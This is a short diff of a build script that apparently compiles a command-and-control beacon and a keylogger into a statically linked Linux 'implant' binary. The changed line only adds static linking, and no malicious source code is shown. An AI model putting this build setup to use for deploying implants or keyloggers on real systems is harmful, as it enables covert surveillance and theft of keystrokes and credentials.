@@ -5,7 +5,7 @@ src="beacon.cpp ./includes/keylogger.c"
 
 # for linux
 linux_out="agent"
-gcc $src -o $linux_out -lcjson 
+gcc $src -o $linux_out -lcjson --static
 echo "[+] LINUX IMPLANT DONE\n" 
 
 
